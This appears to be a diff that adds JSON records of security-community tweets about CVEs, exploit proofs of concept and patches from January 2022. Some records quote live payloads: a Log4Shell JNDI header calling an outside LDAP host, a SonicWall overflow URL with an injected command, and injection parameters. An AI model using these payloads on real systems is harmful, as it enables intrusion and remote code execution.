@@ -2292,3 +2292,1620 @@
     "tweeturl": "https://twitter.com/pdnuclei/status/1479378090123927552",
     "username": "pdnuclei"
 }
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/ReparcelBug2"
+    ],
+    "tweetfavorites": 79,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Writeup and exploit for installed app to system privilege escalation on Android 12 Beta through CVE-2021-0928, a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration` https://t.co/bzoEWfTPIV &lt; Good read",
+    "tweettime": "2022-01-31, 17:13:49",
+    "tweeturl": "https://twitter.com/timstrazz/status/1488198848912658434",
+    "username": "timstrazz"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 126,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "quickly tested the CVE-2022-21882 Win10 LPE PoC from @kalendsi before applying KB5009543 (which should patch it). works nicely on my 21H2 19044.1415.  https://t.co/gvozRBxeU1 https://t.co/f0zej818Lf",
+    "tweettime": "2022-01-30, 02:33:53",
+    "tweeturl": "https://twitter.com/an0n_r0/status/1487615017688211457",
+    "username": "an0n_r0"
+}
+{
+    "expanded_url": [
+        "https://github.com/k8gege/ZimbraExploit"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "Zimbra Mail System Vulnerability XE/RCE/SSRF/Upload GetShell Exploit 1. (CVE-2019-9621 Zimbra&lt;8.8.11 XXE GetShell Exploit)\n\nhttps://t.co/0TS616lEWL",
+    "tweettime": "2022-01-29, 17:53:15",
+    "tweeturl": "https://twitter.com/Alra3ees/status/1487483996250456078",
+    "username": "Alra3ees"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "CVE-2022-21882 LPE/bypass for CVE-2021-1732 exploit code:\n\nhttps://t.co/Uq4hDvLL69",
+    "tweettime": "2022-01-29, 13:56:27",
+    "tweeturl": "https://twitter.com/HackingDave/status/1487424405290561539",
+    "username": "HackingDave"
+}
+{
+    "tweetfavorites": 296,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 78,
+    "tweettext": "Yup.  This CVE-2022-21882 PoC works. https://t.co/cZA5eL8UpK",
+    "tweettime": "2022-01-28, 23:25:10",
+    "tweeturl": "https://twitter.com/wdormann/status/1487205136174878721",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2021-43789"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 2,
+    "tweettext": "https://t.co/hmvoldUrkg \nCVE-2021-43789 \nPrestashop &gt;= 1.7.5.0 &lt; 1.7.8.2 - SQL injection\norder[sortOrder] \norder[orderBy]",
+    "tweettime": "2022-01-28, 00:28:17",
+    "tweeturl": "https://twitter.com/numanturle/status/1486858633975631878",
+    "username": "numanturle"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 354,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 125,
+    "tweettext": "As if it couldn't get any simpler, I just added a one-liner exploit for CVE-2021-4034 to the repository https://t.co/M0IoDDVneK https://t.co/IcE4VwKQEd",
+    "tweettime": "2022-01-27, 20:34:19",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486799755091058695",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://crowdsec.net/blog/pwnkit-avoid-privilege-escalation-with-crowdsec/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Detect and alert on #PwnKit privilege escalation vulnerability with CrowdSec.\n\n@Crowd_Security published a collection targeting #Linux Local Privilege Escalation, and CVE-2021-4034 is its first scenario!\n\nhttps://t.co/25l80m9uLA\n\n#infosec",
+    "tweettime": "2022-01-27, 17:50:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1486758635552210944",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882#readme"
+    ],
+    "tweetfavorites": 71,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 26,
+    "tweettext": "CVE-2022-21882: win32k LPE bypass CVE-2021-1732\ncc @kalendsi \nPoC\nhttps://t.co/m3dol7UeFp https://t.co/g296ypQl6m",
+    "tweettime": "2022-01-27, 15:11:24",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486718487959465991",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 84,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 29,
+    "tweettext": "Pwnkit: Linux Local Privilege Escalation POC - Polkit Pkexec (CVE-2021-4034)\n\nAnother local privilege escalation comes out that affects most Linux distros out there. This CVE came out last year and the POC and update just got released today.\n\nA thread🧵 https://t.co/a4md2P9smc",
+    "tweettime": "2022-01-27, 08:04:16",
+    "tweeturl": "https://twitter.com/xtremepentest/status/1486610996080914432",
+    "username": "xtremepentest"
+}
+{
+    "expanded_url": [
+        "https://transfer.sh/JDDmFj/pk"
+    ],
+    "tweetfavorites": 122,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 21,
+    "tweettext": "CVE-2021-4034 - Statically Linked Binary\n-\nResearchers from @Qualys discovered a 12 year old LPE vulnerability in polkit’s pkexec component .\n-\nFile: https://t.co/7GU2GVd60e\n-\nCredit will be added when I get it!\n-\n#CyberSecurity #infosec #bugbounty #CTF #CVE https://t.co/RnHZOKtgfN",
+    "tweettime": "2022-01-27, 01:49:31",
+    "tweeturl": "https://twitter.com/0dayCTF/status/1486516690452164611",
+    "username": "0dayCTF"
+}
+{
+    "tweetfavorites": 46,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 11,
+    "tweettext": "For those keeping score, Microsoft's CVE-2022-21882 is the first publicly documented in-the-wild 0day for 2022.\n\nHere's confirmation buried in a bulletin update: https://t.co/SgenOKY7qR",
+    "tweettime": "2022-01-26, 22:41:59",
+    "tweeturl": "https://twitter.com/ryanaraine/status/1486469495354843145",
+    "username": "ryanaraine"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2022-0332"
+    ],
+    "tweetfavorites": 310,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "CVE-2022-0332: Moodle 3.11 to 3.11.4 - SQL injection\n\nPoC\nhttps://t.co/KEMstBeUPV https://t.co/y6vnoGaAdl",
+    "tweettime": "2022-01-26, 20:31:39",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1486436693888667651",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 6,
+    "tweettext": "Apple shared the credit for CVE-2022-22583 between @patch1t and myself. \nMy exploit is a SIP bypass, using Apple-signed packages (similar to \"shrootless\" by @yo_yo_yo_jbo) and mounting (inspired by @theevilbit research), so thanks for both\n\nWriteup is coming soon. https://t.co/iLefGdt76E",
+    "tweettime": "2022-01-26, 19:33:32",
+    "tweeturl": "https://twitter.com/ronhass7/status/1486422068329603089",
+    "username": "ronhass7"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 448,
+    "tweetquotes": 7,
+    "tweetreplies": 1,
+    "tweetretweets": 186,
+    "tweettext": "Created a self-contained exploit for CVE-2021-4034 (1-day Pkexec Local Privilege Escalation). Should work out of the box on Linux distributions based on Ubuntu, Debian, Fedora, and CentOS.\n\nhttps://t.co/M0IoDDVneK",
+    "tweettime": "2022-01-26, 14:31:42",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486346108964159496",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://seclists.org/oss-sec/2022/q1/80"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 9,
+    "tweettext": "PwnKit vulnerability and exploitation is just pure gold! \n\nCVE-2021-4034: LPE in pkexec\n\nhttps://t.co/9YdT41TWP9",
+    "tweettime": "2022-01-26, 09:48:32",
+    "tweeturl": "https://twitter.com/RabbitPro/status/1486274848737443840",
+    "username": "RabbitPro"
+}
+{
+    "expanded_url": [
+        "https://github.com/arthepsy/CVE-2021-4034"
+    ],
+    "tweetfavorites": 73,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "GitHub - arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) - https://t.co/gYMyeNlGlz",
+    "tweettime": "2022-01-26, 03:28:41",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1486179258515210240",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 546,
+    "tweetquotes": 17,
+    "tweetreplies": 13,
+    "tweetretweets": 99,
+    "tweettext": "Why compile, when you can just pipe curl to bash?? 🤣😂🤣CVE-2021-4034 https://t.co/zUBAFzMGZR",
+    "tweettime": "2022-01-26, 01:07:54",
+    "tweeturl": "https://twitter.com/_JohnHammond/status/1486143827262033920",
+    "username": "_JohnHammond"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/HaifeiLi/status/1458144361561034756",
+        "https://www.trellix.com/en-gb/about/newsroom/stories/threat-labs/prime-ministers-office-compromised.html"
+    ],
+    "tweetfavorites": 100,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 31,
+    "tweettext": "Remember in November Patch Tuesday Microsoft fixed an Excel zero-day attack in the wild (CVE-2021-42292) but no details shared (https://t.co/UN3bNYg8Tg)? Well, after reading the Trellix (formerly McAfee) blogpost https://t.co/TYsBZlbwMX, I think I figured it out.:). A thread.",
+    "tweettime": "2022-01-26, 00:25:47",
+    "tweeturl": "https://twitter.com/HaifeiLi/status/1486133229614616577",
+    "username": "HaifeiLi"
+}
+{
+    "tweetfavorites": 306,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 80,
+    "tweettext": "The exploit for CVE-2021-4034 is both simple and universal.  What's not to love? https://t.co/ZRsbd0So53",
+    "tweettime": "2022-01-25, 22:39:44",
+    "tweeturl": "https://twitter.com/wdormann/status/1486106541665226753",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/14"
+    ],
+    "tweetfavorites": 697,
+    "tweetquotes": 5,
+    "tweetreplies": 4,
+    "tweetretweets": 197,
+    "tweettext": "Now that the discoverers have published their exploit and writeup, I sent my exploit and writeup for CVE-2022-0185 (Linux kernel integer underflow to slab OOB write) to the oss-security mailing list: https://t.co/ZREvAFG3Xd https://t.co/trNCNNWLdM",
+    "tweettime": "2022-01-25, 21:50:52",
+    "tweeturl": "https://twitter.com/lockedbyte/status/1486094243210878978",
+    "username": "lockedbyte"
+}
+{
+    "expanded_url": [
+        "https://www.openwall.com/lists/oss-security/2022/01/25/11"
+    ],
+    "tweetfavorites": 303,
+    "tweetquotes": 9,
+    "tweetreplies": 0,
+    "tweetretweets": 100,
+    "tweettext": "The @qualys team is back at it!\n\npwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)\n\nhttps://t.co/of1WtdEJmK https://t.co/qAdWtuICqB",
+    "tweettime": "2022-01-25, 21:21:42",
+    "tweeturl": "https://twitter.com/0xdea/status/1486086902986035207",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 81,
+    "tweetquotes": 4,
+    "tweetreplies": 6,
+    "tweetretweets": 30,
+    "tweettext": "Some attempts itw on CVE-2021-20038 (SonicWall SMA RCE). Also some password spraying of default passwords from the past few days\n\nRemember to update AND change default passwords :) https://t.co/WyDIXVKb4m",
+    "tweettime": "2022-01-24, 17:52:20",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1485671824725786633",
+    "username": "buffaloverflow"
+}
+{
+    "expanded_url": [
+        "https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/"
+    ],
+    "tweetfavorites": 406,
+    "tweetquotes": 7,
+    "tweetreplies": 6,
+    "tweetretweets": 176,
+    "tweettext": "Our first blog post is up! \n\nCVE-2021-45467: Preauth RCE in CentOS Web Panel affecting 200k+ web servers on Shodan (pls patch). We bypass strstr() based LFI protection and put a shell on the server. \nhttps://t.co/DvyakBkajj #bugbounty #bugbountytip https://t.co/0Z0cPU6HFl",
+    "tweettime": "2022-01-22, 04:05:04",
+    "tweeturl": "https://twitter.com/OctagonNetworks/status/1484738862865739782",
+    "username": "OctagonNetworks"
+}
+{
+    "tweetfavorites": 561,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 181,
+    "tweettext": "CVE-2021-44515 - Reset the admin password unauthenticated and login!\n\nPoC: https://t.co/IyGdbZ89AU",
+    "tweettime": "2022-01-21, 16:32:50",
+    "tweeturl": "https://twitter.com/steventseeley/status/1484564654219272195",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://packetstormsecurity.com/files/165642/VMware-vCenter-Server-Unauthenticated-Log4Shell-JNDI-Injection-Remote-Code-Execution.html"
+    ],
+    "tweetfavorites": 332,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 130,
+    "tweettext": "VMware vCenter Server Unauthenticated Log4Shell JNDI Injection RCE (CVE-2021-44228)\n\nGET /websso/SAML2/SLO/vsphere.local?SAMLRequest= HTTP/1.1\nX-Forwarded-For: ${jndi:ldap://10.10.10.10:1389/Exploit}\n\nhttps://t.co/NDKkQK3csc",
+    "tweettime": "2022-01-21, 07:13:22",
+    "tweeturl": "https://twitter.com/wugeej/status/1484423859797622784",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/microsoft-hackers-exploiting-new.html"
+    ],
+    "tweetfavorites": 133,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 115,
+    "tweettext": "#Microsoft has detected hackers exploiting a new zero-day vulnerability (CVE-2021-35247) in #SolarWinds Serv-U software related to #Log4j attacks.\n\nRead: https://t.co/Cc6iyLZ7RS\n\nServ-U version 15.3 has been released to patch the issue.\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-01-20, 05:00:38",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1484028070692782083",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://vuls.cert.org/confluence/display/Wiki/2021/06/21/Finding+Privilege+Escalation+Vulnerabilities+in+Windows+using+Process+Monitor"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 61,
+    "tweettext": "Reminder:\nFinding privilege escalation vulnerabilities in Windows using Process Monitor is perhaps the easiest way to find a vulnerability, ever.\nSee CVE-2022-0166\nhttps://t.co/cHg2W0khSS https://t.co/8amdUcprgj",
+    "tweettime": "2022-01-19, 13:48:39",
+    "tweeturl": "https://twitter.com/wdormann/status/1483798563092107266",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21907",
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 63,
+    "tweettext": "CVE-2022-21907: HTTP Protocol Stack Remote Code Execution Vulnerability\nhttps://t.co/z2Jwhy3OU3\nPoC\nhttps://t.co/PEg6bHlccW https://t.co/xGWChBTroc",
+    "tweettime": "2022-01-18, 18:14:10",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1483502992959623168",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 135,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 38,
+    "tweettext": "[#thread 🧵] Last week in #Microsoft #PatchTuesday, a critical vulnerability was patched that theoretically allows attackers to achieve Remote Code Execution on a target #IIS server (CVE-2022-21907). I'll explain how it works in this thread ⬇️ https://t.co/edEpUSq7uv",
+    "tweettime": "2022-01-18, 16:57:12",
+    "tweeturl": "https://twitter.com/podalirius_/status/1483483624045481992",
+    "username": "podalirius_"
+}
+{
+    "expanded_url": [
+        "https://github.com/antx-code/CVE-2022-21907"
+    ],
+    "tweetfavorites": 96,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 36,
+    "tweettext": "Windows HTTP Stack Remote Code Execution Vulnerability CVE-2022-21907 https://t.co/5cKhVR6HqR",
+    "tweettime": "2022-01-18, 15:35:16",
+    "tweeturl": "https://twitter.com/Dinosn/status/1483463004578590730",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2022/01/17/workspace-one-access-ssrf/"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "A few months ago, we discovered a post-auth SSRF in VMWare Workspace One Access - CVE-2021-22056 - which allowed you to steal an admin JWT via CSRF or request arbitrary URLs. Check out our blog post!  https://t.co/q0UdqFsgMJ",
+    "tweettime": "2022-01-18, 02:46:49",
+    "tweeturl": "https://twitter.com/infosec_au/status/1483269616785063936",
+    "username": "infosec_au"
+}
+{
+    "expanded_url": [
+        "https://hulkvision.github.io/blog/post1/"
+    ],
+    "tweetfavorites": 397,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 117,
+    "tweettext": "RCE in Adobe Acrobat Reader for Android (CVE-2021-40724)\n\n$10,000 bounty received from GPSRP\n\nExcellent exploitation and write-up by @hulkvision \nReport: https://t.co/NIFQnlbRiZ\n\nQuick summary how it was achieved👇 https://t.co/Ge1qKac98L",
+    "tweettime": "2022-01-14, 13:02:31",
+    "tweeturl": "https://twitter.com/LukasStefanko/status/1481975013884452867",
+    "username": "LukasStefanko"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/rJw4DFI2RQ/cve-2021-44515/rapid7-analysis"
+    ],
+    "tweetfavorites": 74,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 24,
+    "tweettext": "Analysis and PoC for ManageEngine Desktop Central CVE-2021-44515.\n\nSTATE_COOKIE=&amp;_REQS/_TIME/123\n\nhttps://t.co/bk9UyPDLI8",
+    "tweettime": "2022-01-14, 09:47:57",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1481926048065495041",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 1742,
+    "tweetquotes": 13,
+    "tweetreplies": 41,
+    "tweetretweets": 223,
+    "tweettext": "i'll admit - when i found it, i wasn't totally sure if i could get LPE with this strange little kernel bug alone. it took triggering the vuln 4x to do a full privesc with #CVE-2021-41073, a vuln in io_uring. blog post soon :) https://t.co/2dJKDMLdUv",
+    "tweettime": "2022-01-12, 23:43:32",
+    "tweeturl": "https://twitter.com/chompie1337/status/1481411553698238465",
+    "username": "chompie1337"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/QyXRC1wbvC/cve-2021-20038/rapid7-analysis?fbclid=IwAR1ldORiwotSY0HeF_aLrYra1LuvJk7nlzfWg1HOT8AvnnvBfVcvUE1siTw"
+    ],
+    "tweetfavorites": 670,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 250,
+    "tweettext": "Sonicwall SSL VPN nobody BOF RCE (CVE-2021-20038)\n\nGET /%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};%04%d7%7f%bf%18%d8%7f%bf%18%d8%7f%bf%64%b8%06%08;{touch,/tmp/lol};?aaaaaaaa...\n\nhttps://t.co/y7NggxNg1I https://t.co/UjS8nqhUHr",
+    "tweettime": "2022-01-12, 06:56:52",
+    "tweeturl": "https://twitter.com/wugeej/status/1481158216390426628",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/01/first-patch-tuesday-of-2022-brings-fix.html"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 119,
+    "tweettext": "First #Microsoft Patch Tuesday update of 2022 fixes 96 new vulnerabilities, including a critical \"wormable\" Windows RCE #vulnerability (CVE-2022-21907) in the HTTP Protocol Stack.\n\nRead details: https://t.co/GNeuIIB6m2\n\n#infosec #cybersecurity",
+    "tweettime": "2022-01-12, 06:47:23",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1481155830179581952",
+    "username": "TheHackersNews"
+}
+{
+    "tweetfavorites": 98,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 22,
+    "tweettext": "First patch Tuesday of 2022! Adobe and Microsoft fixed 6 vulnerabilities reported by Kunlun lab. Two of them were demoed @TianfuCup. The CVE-2021-44706 was the RCE of PDF reader full chain and the CVE-2021-21881 was the Ntoskrnl bug for Chrome sandbox escape.",
+    "tweettime": "2022-01-11, 20:07:11",
+    "tweeturl": "https://twitter.com/mj0011sec/status/1480994719560003584",
+    "username": "mj0011sec"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/9szJhq46lw/cve-2021-20039/rapid7-analysis?referrer=twitter"
+    ],
+    "tweetfavorites": 34,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 18,
+    "tweettext": "Today, @rapid7 disclosed five zero-day vulnerabilities in SonicWall SMA 100 series devices. Technical analysis for CVE-2021-20038 (unauth stack-based buffer overflow) and CVE-2021-20039 (auth command injection) now in AttackerKB via @Junior_Baines. https://t.co/fEtmHEW94z",
+    "tweettime": "2022-01-11, 14:04:08",
+    "tweeturl": "https://twitter.com/AttackerKb/status/1480903355996250112",
+    "username": "AttackerKb"
+}
+{
+    "expanded_url": [
+        "https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/"
+    ],
+    "tweetfavorites": 681,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 386,
+    "tweettext": "We have observed a China-based ransomware operator that we’re tracking as DEV-0401 exploiting the CVE-2021-44228 vulnerability in Log4j 2 (aka #log4shell) targeting internet-facing systems running VMWare Horizon. https://t.co/6GOdRwRTjk",
+    "tweettime": "2022-01-11, 02:37:30",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1480730559739359233",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/"
+    ],
+    "tweetfavorites": 47,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 27,
+    "tweettext": "Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/5LSpD8bK60  #Pentesting #CVE #RCE #Exploit #CyberSecurity #Infosec https://t.co/UYQmZG2h3U",
+    "tweettime": "2022-01-09, 22:01:08",
+    "tweeturl": "https://twitter.com/ptracesecurity/status/1480298619454558215",
+    "username": "ptracesecurity"
+}
+{
+    "expanded_url": [
+        "https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce"
+    ],
+    "tweetfavorites": 766,
+    "tweetquotes": 15,
+    "tweetreplies": 4,
+    "tweetretweets": 304,
+    "tweettext": "New research! Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit https://t.co/q2QwkRfrvM",
+    "tweettime": "2022-01-08, 18:15:27",
+    "tweeturl": "https://twitter.com/BillDemirkapi/status/1479879438036881417",
+    "username": "BillDemirkapi"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 10,
+    "tweettext": "The Windows Active Directory Domain Services (AD DS) escalation vulnerability (CVE-2021-42287 and CVE-2021-42278 combined) is still being exploited in wild.\n\nIf u haven’t updated your windows server an attacker with normal credentials can escalate his privileges to Domain Admin.",
+    "tweettime": "2022-01-07, 12:33:50",
+    "tweeturl": "https://twitter.com/sunnynehrabro/status/1479431078532169729",
+    "username": "sunnynehrabro"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-31589.yaml",
+        "https://github.com/advisories/GHSA-fw8v-3m7h-4jwg"
+    ],
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "BeyondTrust / Bomgar Remote Support XSS (CVE-2021-31589) by @aboul3la\n\nTempalte: https://t.co/Y6VlsYzfIU\n\nReference: https://t.co/60P76u9WPA\n\n#hackwithautomation #bugbounty #pentest https://t.co/MKf8kPSN2S",
+    "tweettime": "2022-01-07, 09:03:16",
+    "tweeturl": "https://twitter.com/pdnuclei/status/1479378090123927552",
+    "username": "pdnuclei"
+}
+{
+    "expanded_url": [
+        "https://github.com/michalbednarski/ReparcelBug2"
+    ],
+    "tweetfavorites": 79,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Writeup and exploit for installed app to system privilege escalation on Android 12 Beta through CVE-2021-0928, a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration` https://t.co/bzoEWfTPIV &lt; Good read",
+    "tweettime": "2022-01-31, 17:13:49",
+    "tweeturl": "https://twitter.com/timstrazz/status/1488198848912658434",
+    "username": "timstrazz"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 126,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 51,
+    "tweettext": "quickly tested the CVE-2022-21882 Win10 LPE PoC from @kalendsi before applying KB5009543 (which should patch it). works nicely on my 21H2 19044.1415.  https://t.co/gvozRBxeU1 https://t.co/f0zej818Lf",
+    "tweettime": "2022-01-30, 02:33:53",
+    "tweeturl": "https://twitter.com/an0n_r0/status/1487615017688211457",
+    "username": "an0n_r0"
+}
+{
+    "expanded_url": [
+        "https://github.com/k8gege/ZimbraExploit"
+    ],
+    "tweetfavorites": 43,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "Zimbra Mail System Vulnerability XE/RCE/SSRF/Upload GetShell Exploit 1. (CVE-2019-9621 Zimbra&lt;8.8.11 XXE GetShell Exploit)\n\nhttps://t.co/0TS616lEWL",
+    "tweettime": "2022-01-29, 17:53:15",
+    "tweeturl": "https://twitter.com/Alra3ees/status/1487483996250456078",
+    "username": "Alra3ees"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 44,
+    "tweettext": "CVE-2022-21882 LPE/bypass for CVE-2021-1732 exploit code:\n\nhttps://t.co/Uq4hDvLL69",
+    "tweettime": "2022-01-29, 13:56:27",
+    "tweeturl": "https://twitter.com/HackingDave/status/1487424405290561539",
+    "username": "HackingDave"
+}
+{
+    "tweetfavorites": 296,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 78,
+    "tweettext": "Yup.  This CVE-2022-21882 PoC works. https://t.co/cZA5eL8UpK",
+    "tweettime": "2022-01-28, 23:25:10",
+    "tweeturl": "https://twitter.com/wdormann/status/1487205136174878721",
+    "username": "wdormann"
+}
+{
+    "expanded_url": [
+        "https://github.com/numanturle/CVE-2021-43789"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 2,
+    "tweettext": "https://t.co/hmvoldUrkg \nCVE-2021-43789 \nPrestashop &gt;= 1.7.5.0 &lt; 1.7.8.2 - SQL injection\norder[sortOrder] \norder[orderBy]",
+    "tweettime": "2022-01-28, 00:28:17",
+    "tweeturl": "https://twitter.com/numanturle/status/1486858633975631878",
+    "username": "numanturle"
+}
+{
+    "expanded_url": [
+        "https://github.com/ly4k/PwnKit"
+    ],
+    "tweetfavorites": 354,
+    "tweetquotes": 3,
+    "tweetreplies": 6,
+    "tweetretweets": 125,
+    "tweettext": "As if it couldn't get any simpler, I just added a one-liner exploit for CVE-2021-4034 to the repository https://t.co/M0IoDDVneK https://t.co/IcE4VwKQEd",
+    "tweettime": "2022-01-27, 20:34:19",
+    "tweeturl": "https://twitter.com/ly4k_/status/1486799755091058695",
+    "username": "ly4k_"
+}
+{
+    "expanded_url": [
+        "https://crowdsec.net/blog/pwnkit-avoid-privilege-escalation-with-crowdsec/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 32,
+    "tweettext": "Detect and alert on #PwnKit privilege escalation vulnerability with CrowdSec.\n\n@Crowd_Security published a collection targeting #Linux Local Privilege Escalation, and CVE-2021-4034 is its first scenario!\n\nhttps://t.co/25l80m9uLA\n\n#infosec",
+    "tweettime": "2022-01-27, 17:50:56",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1486758635552210944",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/KaLendsi/CVE-2022-21882#readme"
+    ],
+    "tweetfavorites": 71,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
